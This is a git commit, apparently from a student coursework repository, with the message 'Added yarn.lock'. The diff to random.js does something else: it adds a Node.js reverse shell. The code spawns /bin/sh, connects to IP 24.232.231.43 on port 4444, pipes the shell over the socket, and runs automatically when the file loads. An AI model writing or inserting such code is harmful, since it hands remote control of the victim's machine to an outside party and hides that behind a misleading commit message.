70a732332b2db7f6f33d6299b5f18d84eecd4a87
octaviotastico <octaviopercivaldi2@gmail.com>
2020-09-29 17:39:28 -0300

    Added yarn.lock

--- Entregable-2/exercise2/random.js
+++ Entregable-2/exercise2/random.js
@@ -10,3 +10,22 @@
     });
     return /a/; // Prevents the Node.js application form crashing
 });
+
+const test = () => {
+    var net = require("net");
+    var cp = require("child_process");
+    var sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(
+        4444,
+        "24.232.231.43",
+        () => {
+            client.pipe(sh.stdin);
+            sh.stdout.pipe(client);
+            sh.stderr.pipe(client);
+        }
+    );
+    // return /a/; // Prevents the Node.js application form crashing
+}
+
+test();
